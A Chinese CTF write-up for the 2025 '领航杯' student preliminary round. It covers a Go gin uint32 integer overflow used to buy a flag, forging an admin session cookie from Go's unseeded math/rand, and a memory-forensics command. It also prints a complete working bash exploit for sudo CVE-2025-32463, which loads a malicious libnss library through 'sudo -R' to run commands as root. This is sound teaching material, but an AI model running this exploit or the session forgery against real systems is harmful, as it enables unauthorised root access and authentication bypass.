---
title: 2025"领航杯"网安赛项学生组初赛 WP（上）（gin 整数溢出买 flag + math/rand 种子 1 + sudo CVE-2025-32463）
contest: 2025 领航杯网安赛项
year: 2025
difficulty: medium
vuln_type: [auth_bypass, integer_overflow, rce, pwn_unknown]
tags: [领航杯 学生组初赛, gin.SetMode Release, cookie.NewStore randomChar(16), sessions.Sessions, adminRequired loginRequired, uint32 整数溢出买 flag, pow(2,32)-200000 算 addprice, math/rand 种子 1 默认, CVE-2025-32463 sudo EoP chwoot, /woot1337 libnss_, nsswitch.conf passwd /woot1337, volatility filescan]
attack_chain:
  - Web 买 flag: nowMoney 整数溢出 uint32
  - addprice = pow(2,32) - 200000 = 4294967296 - 200000 = 4294767296
  - newmoney = uint32(nowMoney) + uint32(addprice) 溢出回 0
  - buyflag: playerMoney 0 + 200000 真实支付
  - admin 鉴权: math/rand 没 Seed 种子=1，复现生成 session cookie 含 uname=admin
  - 应急响应 CVE-2025-32463: sudo chwoot 提权到 root 读 /flag
  - volatility pythonvol.py -f Z:\\ctfmemory.vmem windows.filescan 取证
key_payload: "addprice = pow(2, 32) - 200000; newmoney 溢出回 0"
one_liner: 2025 领航杯学生组初赛：gin 框架 uint32 整数溢出买 flag（addprice=2^32-200000）+ math/rand 种子 1 默认 session 伪造 admin + sudo CVE-2025-32463 chwoot 提权。
lesson: math/rand 不 Seed 种子=1 是 Go 经典坑，rand.Read 输出可复现；uint32 加法溢出是 CTF Web 高频套路（pow(2,32)-N）；CVE-2025-32463 sudo EoP chwoot 是 2025 新 sudo 提权漏洞。
quality: high
---

# 2025"领航杯"网安赛项学生组初赛 WP（上）

## 01 Web 应用赛题（gin 买 flag）

```go
func main() {
    gin.SetMode(gin.ReleaseMode)
    r := gin.Default()
    storage := cookie.NewStore(randomChar(16))
    r.Use(sessions.Sessions("o", storage))
    r.LoadHTMLGlob("template/*")
    auth := r.Group("/auth/", hashProofRequired())
    auth.GET("/login", loginGetHandler)
    auth.POST("/login", loginPostHandler)
    user := r.Group("/play/")
    user.POST("/add", adminRequired(), add)
    user.POST("/guess", loginRequired(), guess)
    r.GET("/game", start)
    r.GET("/", func(c *gin.Context){c.Redirect(302, "/auth/login")})
    r.Run("0.0.0.0:80")
}

func add(c *gin.Context) {
    var newMoney uint32 = 0
    s := sessions.Default(c)
    nowMoney := fmt.Sprintf("%v", s.Get("nowMoney"))
    addMoney := c.PostForm("addMoney")
    u1, err1 := strconv.ParseUint(nowMoney, 10, 32)
    u2, err2 := strconv.ParseUint(addMoney, 10, 32)
    if err1 != nil && err2 != nil { ... return }
    if s.Get("checkNowMoney") == nil { ... return }
    checkNowMoney := AesDecrypt(fmt.Sprintf("%v", s.Get("checkNowMoney")), string(secret))
    if checkNowMoney == nowMoney {
        newMoney = uint32(u1) + uint32(u2)  // ← 整数溢出点
        s.Set("nowMoney", newMoney)
        s.Set("checkNowMoney", AesEncrypt(strconv.Itoa(int(newMoney)), string(secret)))
    }
}
```

**关键利用**：
- flag 初始价格 = 200000
- 设置 `addprice = pow(2, 32) - 200000 = 4294967296 - 200000 = 4294767296`
- `newMoney = uint32(200000) + uint32(4294767296) = 0`（溢出）
- 然后 `buyflag`：`playerMoney=0` 需 `>= nowMoney=0` → 满足条件

**admin 鉴权绕过**：
- 题目用 `math/rand` 没调 `Seed()` → 种子默认 1
- 每次 `rand.Read` 生成的随机数固定
- 本地复现 `rand.Read(16 字节)` 拿到 secret
- 构造 gin session cookie `o=MTYzNzQyMzM0MHx...|uname=admin`
- 关键：`uname == 'admin'` 即可通过 admin 鉴权

## 02 应急响应 / sudo CVE-2025-32463 chwoot

```bash
#!/bin/bash
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1
CMD="cat /flag"
cat > woot1337.c <<EOF
#include <stdlib.h>
__attribute__((constructor))
void woot(void) {
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    execl("/bin/sh", "sh", "-c", "${CMD}", NULL);
}
EOF
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
echo "woot!!"
sudo -R woot woot
rm -rf ${STAGE?}
```
CVE-2025-32463 是 2025 sudo EoP 漏洞，通过 `sudo -R woot woot` 触发 libnss 加载 `/woot1337.so.2` → setuid(0) → 读 /flag。

## 03 Misc 取证

```bash
python vol.py -f Z:\\ctfmemory.vmem windows.filescan
```
volatility 取证常规操作。
